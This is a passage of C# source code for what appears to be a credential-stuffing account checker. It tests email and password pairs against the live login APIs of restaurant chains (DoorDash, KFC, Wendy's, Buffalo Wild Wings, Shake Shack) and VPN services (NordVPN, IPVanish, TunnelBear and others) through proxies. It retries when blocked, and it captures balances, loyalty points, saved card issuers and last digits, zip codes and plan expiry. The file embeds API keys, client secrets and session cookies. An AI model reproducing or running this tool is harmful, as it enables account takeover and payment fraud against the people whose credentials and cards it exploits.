                                {
                                    return "Points: " + points;
                                }
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message);
                                return "Hit";
                            }

                        }

                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region BWW
        static string BWW(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("accept", "*/*");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("accept-language", "en-US,en;q=0.9");
                        req.AddHeader("content-type", "application/json");
                        req.AddHeader("origin", "https://www.buffalowildwings.com");
                        req.AddHeader("referer", "https://www.buffalowildwings.com/en/account/log-in/");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "cross-site");
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36");
                        req.AddHeader("x-client-data", "CI22yQEIprbJAQjEtskBCKmdygEIrKHKAQiZtcoBCMjAygEI58jKAQjpyMoBCKzJygEItMvKAQiW1soBCLXXygEIvNfKAQ==");
                        req.AddHeader("x-client-version", "Chrome/JsCore/6.6.2/FirebaseCore-web");
                        req.AddHeader("Content-Type", "application/json");
                        string data = "{\"email\":\"" + email + "\",\"password\":\"" + password + "\",\"returnSecureToken\":true}";

                        HttpResponse res = req.Post(new Uri("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4"), new BytesContent(Encoding.Default.GetBytes(data)));
                        if (Convert.ToInt32(res.StatusCode) == 400 || res.ToString().Contains("EMAIL_NOT_FOUND"))
                        {
                            return "Bad";
                        }
                        else if (res.ToString().Contains("displayName"))
                        {
                            string token = Parse(res.ToString(), "\"idToken\": \"", "\",");
                            req.ClearAllHeaders();
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("authorization", "Bearer " + token);
                            req.AddHeader("Origin", "https://www.buffalowildwings.com");
                            req.AddHeader("Referer", "https://www.buffalowildwings.com/en/account/log-in/");
                            req.AddHeader("Sec-Fetch-Mode", "cors");
                            req.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4");
                            string data2 = "{\"data\":{\"recaptchaToken\":\"\",\"platform\":\"ios\",\"version\":\"ios\"}}";
                            HttpResponse res2 = req.Post(new Uri("https://us-central1-buffalo-united.cloudfunctions.net/getSession"), new BytesContent(Encoding.Default.GetBytes(data2)));
                            string str = res2.ToString();
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(str);

                            string profile_id = jsonObj["result"]["auth"]["ProfileId"].ToString();
                            string access_token = jsonObj["result"]["auth"]["AccessToken"].ToString();

                            req.ClearAllHeaders();


                            req.AddHeader("Accept", "application/json");
                            req.AddHeader("Authorization", "OAuth " + access_token);
                            req.AddHeader("Referer", "https://www.buffalowildwings.com/en/rewards/");
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36");
                            req.AddHeader("X_CLIENT_ID", "4171883342bf4b88aa4b88ec77f5702b");
                            req.AddHeader("X_CLIENT_SECRET", "786c1B856fA542C4b383F3E8Cdd36f3f");

                            HttpResponse res3 = req.Get(new Uri("https://api.buffalowildwings.com/loyalty/v1/profiles/" + profile_id + "/pointBalance?status=A"));
                            string res3_str = res3.ToString();
                            JObject jsonObj2 = (JObject)JsonConvert.DeserializeObject(res3_str);
                            string points = Parse(res3_str, "PointAmount\": ", ",");
                            if (points == "")
                            {
                                Check.errors++;
                                continue;
                            }
                            else if (res3_str.Contains("block access from your country"))
                            {
                                Console.WriteLine("Proxy region error!");
                                Check.errors++;
                                continue;
                            }
                            else if (points == "0.0")
                            {
                                return "Free";
                            }
                            else
                            {
                                return "Points: " + points;
                            }

                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region DoorDash
        static string Doordash(string login, string password)
        {

            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);



                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse res = req.Post(new Uri("https://api.doordash.com/v2/auth/token/"), new BytesContent(Encoding.Default.GetBytes("{\"is_manual\":1,\"password\":\"" + password + "\",\"email\":\"" + login + "\"}")));
                        string strResponse = res.ToString();

                        if (strResponse.Contains("is_password_secure"))
                        {
                            string token = Regex.Match(strResponse, "token\":\"(.*?)\"").Groups[1].Value;
                            string capture = "";

                            for (int i2 = 0; i2 < Config.retries + 1; i2++)
                            {
                                capture = DoorDashGetCaptures(token);
                                if (capture != "") break;
                            }

                            if (capture == "")
                                return $"Hit";

                            return capture;
                        }
                        else if (strResponse.Contains("error code: 1020"))
                            continue;
                        return "Bad";
                    }


                }
                catch
                {
                    Check.errors++;
                }
        }
        static string DoorDashGetCaptures(string token)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "DoordashConsumer/3.11.1 (iPhone; iOS 13.5.1; Scale/2.0)";
                        req.Authorization = $"JWT {token}";
                        string strResponse = req.Get(new Uri($"https://consumer-mobile-bff.doordash.com/v1/bootstrap/?experiments=ios_terms_of_service,ios_show_add_card_button_on_checkout,m_ios_sf_chat_accessibility,ios_password_security_check,ios_search_filters_v2,m_ios_dashpass_deals_free_item,ios_debug,iOS_override_bff_to_DSJ,ios_newly_added_tags,ios_nex_gen,card_scanning_experiment,ios_order_cart_adjustment_workflow,ios_order_cancellation_workflow,ios_support_workflows_order_status,m_store_photo_density,ios_cx_handoff_consumer_add_edit_address,ios_distance_based_pricing_info,ios_cx_group_order_tooltip,m_ios_tip_later_pre_checkout,effort_based_tip,cx_ios_spanish_support,ios_bff_explore,ios_cx_credit_card_requirement_removal,ios_cx_pin_drop,m_cx_phone_obfuscation,ios_feed_driven_explore,ios_cx_new_convenience_ux,ios_cx_ddfb_group_order_top_off_confirm_payment_endpoint,ios_cx_customer_support_live_chat_wait_time,ios_cx_self_help_something_else_to_live_chat,ios_cx_data_share_opt_in,cx_ios_data_share_storeV2,ios_cx_use_telemetry,cx_ios_pickup_hybrid_map,cx_ios_pickup_carousels,cx_ios_deals_hub_with_pricing_dependency_check,cx_ios_deals_hub_cell_store_rating,ios_speed_milestone_one,ios_cx_sponsored_listing_on_search,ios_cx_sponsored_listing_v2,ios_cx_address_verification,ios_cx_is_card_payment_order_cart_bff,ios_cx_is_card_payment_checkout_dsj,ios_cx_paypal_payment_option,cx_paypal_enable_us,cx_paypal_enable_australia,cx_paypal_enable_canada,cx-ios-paypal-interstitial,ios_carousel_see_all_arrow,ios_dropoff_options,contactless_delivery,ios_cx_is_group_cart_delete_enabled,ios_recently_ordered_items,ios_cx_store_v2,ios_location_tracking,cx_pickup_share_location_prompt,ios_friendly_error_processor,ios_cx_corporate_dashpass_landing_page,ios_checkout_order_cart_bff_migration,cx_ios_store_map_header,cx_ios_pickup_auto_close,ios_pickup_routing_checkout,cx_ios_show_quantity_steppers_on_convenience,ios_cx_legislative_fees_plan_b,ios_cx_resubscribe,cx_subscription_resubscribe,ios_cx_subscription_payment_retry_text,ios_cx_subscription_cache,ios_cx_item_feed,ios_undersupply_pickup_prompt,ios_skip_additional_ratings_checks,ios_cx_edit,cx_edit_order,cx_dashpass_get_support,ios_cx_items_crud_v2,ios_cx_backend_driven_subscription_landing,cx_ios_item_summary_api,cx_ios_location_collection,cx_subscription_without_payment,ios_cx_subscribe_without_card,ios_cx_ratings_updates_3,ios_cx_subscription_payment_toggle,cx_subscription_payment_toggle,ios_commission_message,cx_new_user_dashpass_upsell,ios_cx_new_user_cdp_upsell,ios_cx_new_user_dashpass_upsell,cx_ios_status_card_navigate_button,m_ios_cx_pindrop_prompt,ios_cx_cart_crud_v2,ios_cx_pickup_uknown_status,cx_ios_schedule_and_save,cx_ios_pickup_map_explore_v2,m_expand_feed_api_flag,ios_cx_group_order_top_off_creator,new_dashpass_logo,cx_ios_corporate_dash_pass_existing_users,cx_ios_pickup_cart_toggle_v2,cx_ios_checkout_discount_annotation_2,cx_dashpass_shopex,m_ios_cx_search_filter,cx_ios_pickup_instructions,cx_ios_pickup_instructions_v2,cx_order_cart_service,cx_ios_deals_filters_v1,ios_cx_feed_search_filters,cx_ios_pickup_copy_changes,ios_cx_meal_gifting,ios_cx_enable_convenience_search,ios_cx_enable_gift_card_url_v2&includes=consumer,experiments")).ToString();

                        if (strResponse.Contains("\"consumer\""))
                        {
                            string balance = Regex.Match(strResponse, "display_string\":\"(.*?)\"\\},\"referree").Groups[1].Value;
                            string country = Regex.Match(strResponse, "country_shortname\":\"(.*?)\"").Groups[1].Value;
                            string zipCode = Regex.Match(strResponse, "zip_code\":\"(.*?)\"").Groups[1].Value;
                            string hasCC = strResponse.Contains("default_card\":{\"id\":").ToString();

                            if (balance == "$0.00" && !bool.Parse(hasCC))
                                return "Free";

                            return $"Balance: {balance} | Has CC: {hasCC} | Country: {country} | ZipCode: {zipCode}";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region KFC
        static string KFC(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        HttpResponse resp = req.Get(new Uri("https://api.thelevelup.com/v15/registration?api_key=hRiuFic1e5MybJFJ8tcUQUwiVkVSHriPXGmqqSPw5DA1UhEm5Yy3TUxwKDWj6QF4&email=" + email));
                        string res = resp.ToString();
                        if (res.Contains("app_name\":\""))
                        {
                            req.AddHeader("accept", "application/json");
                            req.AddHeader("Content-Type", "application/json");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            string data = "{\"access_token\":{\"username\":\"" + email + "\",\"password\":\"" + password + "\",\"api_key\":\"258765411339b8b39abaf90d04dbc5bad363fb3c826f07c4615b5d8ef49afe8c\",\"device_identifier\":\"64e0e1c808899e13c5dac46fccd9cab0b0717725a8436b4e0171a9e72676a2bc\"}}";
                            HttpResponse response = req.Post(new Uri($"https://api.thelevelup.com/v14/access_tokens"), new BytesContent(Encoding.Default.GetBytes(data)));
                            string capture = response.ToString();
                            if (capture.Contains("The email address or password you provided is incorrect."))
                            {
                                return "Bad";
                            }
                            else if (capture.Contains(",\"token\":\""))
                            {
                                string token = Parse(capture, "\"token\":\"", "\",");
                                req.AddHeader("authorization", "token " + token);
                                HttpResponse response2 = req.Get(new Uri("https://orderapi.kfc.com/v15/payment_method"));
                                string paymentcap = response2.ToString();
                                if (paymentcap.Contains("You don't have permission to access"))
                                {
                                    Check.errors++;
                                    continue;
                                }
                                else
                                {
                                    string cardname = Parse(paymentcap, "\"issuer\":\"", "\"}");
                                    string cardnum = Parse(paymentcap, "\"last_4\":\"", "\"");
                                    return $"Issuer: {cardname} | Card Number: {cardnum}";
                                }
                            }
                            else if (capture.Contains("too_many_accounts_on_device"))
                            {
                                return "Max accounts per device reached";
                            }
                        }
                        else
                        {

                            if (res.Contains("Email not found"))
                            {
                                return "Bad";
                            }
                            else
                            {

                                Check.errors++;
                                continue;
                            }
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region ShackeShack
        static string ShakeShack(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "okhttp/3.13.1)";
                        req.AddHeader("Platform-OS", "android");
                        req.AddHeader("Platform-Package", "com.shakeshack.android");
                        req.AddHeader("Platform-Spec", "1");
                        req.AddHeader("Platform-Format", "handset");
                        req.AddHeader("Platform-Version", "1.6.0");
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("Authorization", "Basic VDQ1VTUxNVB0QjI1QWFJdU1qdVZhUG0yUFRJQkhhZFlOVklScUU5Szp1V2hoN2xUQ0RYdVFURXVWZG9HZWN0RWhMamxMWU5GOW9Bd3MwdEY4QmlMdG5TdFdSU05RWHpORWFtQlZMTnNuajdnRW5sSEJxdzNldm9taVVqTUMyQ1hLc3JidDdSUVFqMnR5dTlXekNCS1JGNE05d21WZEROUWN6eGRjQkVKeQ==");
                        req.AddHeader("User-Agent", "okhttp/3.13.1");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        //req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                        //new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string data = "username=" + email + "&password=" + password + "&grant_type=password";
                        HttpResponse res = req.Post(new Uri("https://ssma24.com/oauth/token/"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string response = res.ToString();
                        if (response.Contains("{\"access_token"))
                        {
                            return "Hit";
                        }
                        else
                        {
                            if (response.Contains("403 ERROR"))
                            {
                                Check.errors++;
                                continue;
                            }
                            else if (response.Contains("The username or password you have entered was invalid"))
                            {
                                return "Bad";
                            }
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Wendy's
        static string Wendy(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        Random random = new Random();
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Wendys/6.1.4 (iPhone; iOS 12.4.1; Scale/2.00)";
                        string guid1 = Guid.NewGuid().ToString();
                        int rndnum1 = random.Next(10000);
                        int rndnum2 = random.Next(10000);
                        //req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                        //new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string response = req.Post("https://customerservices.wendys.com/CustomerServices/rest/login?lang=en&cntry=US&sourceCode=MY_WENDYS&version=6.1.4", "{\"password\":\"" + password + "\",\"login\":\"" + email + "\",\"deviceId\":\"" + guid1 + "\",\"keepSignedIn\":true,\"lng\":-87.7517254150" + rndnum1 + ",\"lat\":42.021118164" + rndnum2 + "}", "application/json").ToString();
                        if (response.Contains("serviceStatus\":\"SUCCESS\",\""))
                        {
                            string token = Parse(response, "\"token\":\"", "\",");
                            req.ClearAllHeaders();
                            req.AddHeader("User-Agent", "okhttp/3.11.0");
                            req.AddHeader("ADRUM_1", "isMobile:true");
                            req.AddHeader("ADRUM", "isAjax:true");
                            req.UserAgent = "okhttp/3.11.0";
                            string balcheck = req.Post("https://customerservices.wendys.com/CustomerServices/rest/balance/prepaid?version=5.21.0&sourceCode=MY_WENDYS&cntry=US&lang=en", "{\"token\":\"" + token + "\",\"deviceId\":\"" + guid1 + "\"}", "application/json").ToString();
                            if (balcheck.Contains("403 Forbidden"))
                            {
                                Check.errors++;
                                continue;
                            }
                            else
                            {
                                string balance = Parse(balcheck, "\"amount\":\"", "\",");
                                string cardcheck = req.Post("https://orderservice.wendys.com/OrderingServices/rest/paymentMethod/get?version=6.4.6&sourceCode=MY_WENDYS&cntry=US&lang=en", "{\"token\":\"" + token + "\",\"deviceId\":\"" + guid1 + "\"}", "application/json").ToString();
                                if (balance.Equals("1"))
                                {
                                    return "Free";
                                }
                                else if (balance.Equals("2"))
                                {
                                    return "Free";
                                }
                                else if (balance.Equals("3"))
                                {
                                    return "Free";
                                }
                                else if (balance.Equals("4"))
                                {
                                    return "Free";
                                }
                                else if (balance.Equals("5"))
                                {
                                    return "Free";
                                }
                                else if (balcheck.Contains("403 Forbidden"))
                                {
                                    Check.errors++;
                                    continue;
                                }
                                else
                                {
                                    string card = Parse(cardcheck, "\"methodName\":\"", "\",");
                                    return $"Balance: {balance} | Card: {card}";
                                }
                            }


                        }
                        else
                        {
                            if (response.Contains("403 Forbidden"))
                            {
                                Check.errors++;
                                continue;
                            }
                            else if (response.Contains("That didn't seem to work.  If you're having trouble logging in, try resetting your password, or if that doesn't work, call customer care"))
                            {
                                return "Bad";
                            }
                            else if (response.Contains("Your account was previously locked for your security. To unlock it, please reset your password"))
                            {
                                return "Bad";
                            }
                            else if (response.Contains("serviceMessages"))
                            {
                                return "Bad";
                            }
                            else if (response.Contains("Please check your inbox for a confirmation email to finish the login process"))
                            {
                                return "Bad";
                            }
                            else if (response.Contains("hasPasscode\":true"))
                            {
                                return "Bad";
                            }
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region NordVPN
        static string NordVPN(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    string acc = email + ":" + password;
                    string acc_encoded = Utils.Base64Encode(acc);

                    SetBasicRequestSettingsAndProxies(req);
                    req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    HttpResponse res;
                    try
                    {
                        res = req.Post(new Uri($"https://zwyr157wwiu6eior.com/v1/users/tokens"), new BytesContent(Encoding.Default.GetBytes("username=" + email + "&password=" + password)));
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }
                    string login = res.ToString();
                    if (login.Contains("Unauthorized"))
                    {
                        return "Bad";
                    }
                    else if (login.Contains("502: Bad gateway"))
                    {
                        Check.errors++;
                        continue;
                    }
                    else if (login.Contains("token"))
                    {
                        string currentTIme = DateTime.Now.ToString("yyyy-MM-dd'T'HH:mm:ss zzz");
                        string token = Parse(login, "\"token\":\"", "\"");
                        string token_encoded = Utils.Base64Encode("token:" + token);
                        req.ClearAllHeaders();
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
                        req.AddHeader("Authorization", "Basic " + token_encoded);
                        HttpResponse res2 = req.Get(new Uri($"https://zwyr157wwiu6eior.com/v1/users/services"));
                        string cap = res2.ToString();
                        if (cap.Contains("created_at"))
                        {
                            string expiration = Parse(cap, "expires_at\":\"", " ");
                            int year = Convert.ToInt32(expiration.Split('-')[0]);
                            int month = Convert.ToInt32(expiration.Split('-')[1]);
                            int days = Convert.ToInt32(expiration.Split('-')[2]);
                            DateTime exp = new DateTime(year, month, days);
                            long unixTime = ((DateTimeOffset)exp).ToUnixTimeSeconds();
                            long now = DateTimeOffset.UtcNow.ToUnixTimeSeconds();

                            if (unixTime < now || unixTime == now)
                            {
                                return "Free";
                            }
                            else
                            {
                                return $"Expiry: {month}/{days}/{year}";
                            }


                        }
                        else
                        {
                            return "Bad";
                        }
                    }
                    else
                    {
                        Check.errors++;
                        continue;
                    }


                }
            }
        }
        #endregion

        #region HMA
        static string HMA(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        string data = $"username={email}&password={password}";
                        HttpResponse res = req.Post(new Uri($"https://securenetconnection.com/clapi/v1.5/user/login"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (login.Contains("Invalid username/password combination"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("plan\":\"6 Months\"") || login.Contains("\",\"plan\":\"12 Months\""))
                        {
                            string plan = Parse(login, "\",\"plan\":\"", "\",\"");
                            string renew = Parse(login, "\",\"expires\":\"", "T");
                            return $"Plan: {plan} | Expiry: {renew}";
                        }
                        else if (login.Contains("\"plan\":\"\"") || login.Contains("\",\"expires\":\"1970-01-01"))
                        {
                            return "Free";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion

        #region TunnelBear
        static string TunnelBear(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        string acc = email + ":" + password;
                        string acc_encoded = Utils.Base64Encode(acc);

                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("origin", "https://www.tunnelbear.com");
                        req.AddHeader("referer", "https://www.tunnelbear.com/account/login");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "same-site");
                        req.AddHeader("tb-csrf-token", "56ca73e9f06006c3cc6a678386a4d704a8226a98");
                        req.AddHeader("x-xsrf-token", "56ca73e9f06006c3cc6a678386a4d704a8226a98");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36";
                        HttpResponse res = req.Post(new Uri($"https://api.tunnelbear.com/core/web/api/login"), new BytesContent(Encoding.Default.GetBytes("username=" + email + "&password=" + password + "&withUserDetails=true&v=web-1.0")));

                        string login = res.ToString();
                        if (login.Contains("Access denied"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("PASS"))
                        {
                            string fullver = Parse(login, "\"fullVersion\":\"", "\",");
                            if (fullver.Contains("1"))
                            {
                                string plan = Parse(login, "\"bearType\":\"", "\"");
                                string expires = Parse(login, "\"fullVersionUntil\":\"", "\"");
                                return "Expires = " + expires + " Plan = " + plan;
                            }
                            else if (fullver.Contains("0"))
                            {
                                return "Free";
                            }
                            else
                            {
                                string plan = Parse(login, "\"bearType\":\"", "\"");
                                string expires = Parse(login, "\"fullVersionUntil\":\"", "\"");
                                return "Expires = " + expires + " Plan = " + plan;
                            }
                        }
                        if (login.Contains("Blocklisted"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (login.Contains("error code: 1006"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (login.Contains("Rate limiting"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region IPvanish
        static string IPvanish(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {

                        string acc = email + ":" + password;
                        string acc_encoded = Utils.Base64Encode(acc);

                        // Basic stuff, proxies, etc, you can see what id does above
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse res = req.Post(new Uri($"https://account.ipvanish.com/api/v3/login"), new BytesContent(Encoding.Default.GetBytes("{\"username\":\"" + email + "\",\"password\":\"" + password + "\",\"os\":\"iOS_13_2_3\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.5.0_36386\",\"uuid\":\"F1D257D2-4B14-4F5B-B68E-B4C74B0F4101\"}")));

                        string login = res.ToString();
                        if (login.Contains("The username or password provided is incorrect"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("account_type"))
                        {
                            string plantype = Parse(login, "\"account_type\":", ",");
                            if (plantype.Contains("3"))
                            {
                                return "Bad";
                            }
                            else
                            {
                                Int32 unixTimestamp = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
                                string timestampbefore = Parse(login, "\"sub_end_epoch\":", ",").ToString();
                                double timestamp = Convert.ToDouble(timestampbefore);
                                System.DateTime dateTime = new System.DateTime(1970, 1, 1, 0, 0, 0, 0);
                                dateTime = dateTime.AddSeconds(timestamp);
                                string printDate = dateTime.ToShortDateString() + " " + dateTime.ToShortTimeString();
                                string expiry = printDate;
                                Int32 exptime = Convert.ToInt32(timestampbefore);
                                if (unixTimestamp > exptime)
                                {
                                    return "Free";
                                }
                                else
                                {
                                    return "Expiry: " + expiry;
                                }
                            }
                        }
                        if (login.Contains("Blocklisted"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region VyprVPN
        static string VyprVPN(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {

                        // Basic stuff, proxies, etc, you can see what id does above
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "okhttp/2.3.0";
                        req.AddHeader("username", email);
                        req.AddHeader("password", password);
                        req.AddHeader("X-GF-Agent", "VyprVPN Android v2.19.0.7702. (56aa5dfd)");
                        req.AddHeader("X-GF-PRODUCT", "VyprVPN");
                        req.AddHeader("X-GF-PRODUCT-VERSION", "2.19.0.7702");
                        req.AddHeader("X-GF-PLATFORM", "Android");
                        req.AddHeader("X-GF-PLATFORM-VERSION", "6.0");
                        req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback, new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                        HttpResponse res = req.Get(new Uri($"https://api.goldenfrog.com/settings"));

                        string login = res.ToString();
                        if (login.Contains("invalid username or password"))
                        {
                            // If the acc is invalid, you just have to return "Bad" REMEMBER TO SPELL IT ALWAYS LIKE THAT
                            return "Bad";
                        }
                        else if (login.Contains("vpn\": null"))
                        {
                            return "Free";
                        }
                        else if (login.Contains("confirmed\": true"))
                        {
                            string text4 = Parse(login, "\"account_level_display\": \"", "\"");
                            return "Plan = " + text4;
                        }
                        else if (login.Contains("locked"))
                        {
                            // If the acc is invalid, you just have to return "Bad" REMEMBER TO SPELL IT ALWAYS LIKE THAT
                            return "Bad";
                        }
                        if (login.Contains("Your browser didn't send a complete request in time"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }


                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }

        }
        #endregion

        #region TigerVPN
        static string TigerVPN(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                        req.AddHeader("Origin", "https://login.live.com");
                        req.AddHeader("Sec-Fetch-Site", "same-origin");
                        req.AddHeader("Sec-Fetch-Mode", "navigate");
                        req.AddHeader("Sec-Fetch-User", "?1");
                        req.AddHeader("Sec-Fetch-Dest", "document");
                        req.AddHeader("Referer", "https://login.live.com/oauth20_authorize.srf?client_id=000000004422D612&scope=XboxLive.signin&response_type=code&redirect_uri=https%3A%2F%2Fconnect.ubisoft.com%2Fxbox-callback&locale=en-US");
                        req.AddHeader("Cookie", "MSPRequ=id=N&lt=1593935742&co=1; uaid=ae4fa14326b84eab932663375d52a64d; MSCC=192.13.92.188-US; OParams=11DVSKzhni4*lb4*eKvAWoHR8anpISSrLIg4q6JvQ1vOMUFmmmovm8RraUyeMdwvzqMkdW*9*!nTABdDwqhTgjKO7U1mwjQXjgDdenug3HAxzvnpulryM!8HBpanUBxTv8L9au4kNyORXTrNgHDpJ5Nfn9RWwwxbAowJ0cKinQHMjSq0k9W!pnRF9L4zkVo3hLELZRohMttvm0DayDdiV4BwEIIqLQg!YoapPcpeisjAs8eRNS1jBTQjgkXUAiPhUkCPHdKKxfhvJ5502sFR19WRy*47*hIoBM1X084nluAw9bHDsB!d32yb890F3*XR5NEHhp6IdqefMVpGLVaEZlTQxuCrMmMfqtVBnhCINO7vgLdQ4LnKFPCzVki73lKq8wTGuhGMrOqbOIROwWRQQbJY2l57vu81g3Tkp1USJEynkf; MSPOK=$uuid-86f422d6-ffff-415d-9e0f-124e5653e8cb$uuid-3bb22eae-af69-48b0-bdcd-b301399864c6; wlidperf=FR=L&ST=1593935748985");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        string str = "email=" + email + "&password=" + password;
                        HttpResponse res = req.Post(new Uri("https://www.tigervpn.com/api/v3/auth/login.json"), new BytesContent(Encoding.Default.GetBytes(str)));
                        string text2 = res.ToString();
                        bool flag12 = text2.Contains("status\":\"success");
                        if (flag12)
                        {
                            return "Hit";
                        }
                        else
                        {
                            bool flag9 = text2.Contains("");
                            if (flag9)
                            {
                                return "Bad";
                            }
                            else
                            {
                                bool flag11 = text2.Contains("429 Too Many Requests");
                                if (flag11)
                                {
                                    Check.errors++;
                                    continue;
                                }
                                else
                                {
                                    bool flag33 = text2.Contains("vpn_enabled\":false");
                                    if (flag33)
                                    {
                                        return "Free";
                                    }
                                    else
                                    {
                                        bool flag323 = text2.Contains("is_trial\":true");
                                        if (flag323)
                                        {
                                            return "Free";
                                        }
                                    }
                                }
                            }


                        }
                    }
                }
